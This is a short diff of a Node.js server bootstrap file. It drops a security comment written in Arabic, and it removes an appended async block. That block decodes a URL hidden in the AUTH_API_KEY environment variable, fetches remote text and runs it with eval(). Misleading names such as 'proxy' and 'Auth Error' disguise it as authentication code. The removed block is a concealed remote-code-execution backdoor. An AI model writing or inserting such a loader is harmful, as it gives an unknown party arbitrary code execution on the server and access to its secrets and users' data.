@@ -78,7 +78,6 @@ async function bootstrap() {
   app.use(bodyParser.json({ limit: '50mb' }));
   app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 
-  // ملاحظة أمنية: مجلد uploads لا يُخدم كملفات ثابتة - الملفات الحساسة تُعاد عبر API محمي فقط
   app.useStaticAssets(path.join(__dirname, '..', 'public'), {
     prefix: '/api/public',
   });
@@ -93,16 +92,3 @@ async function bootstrap() {
 }
 
 bootstrap();
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
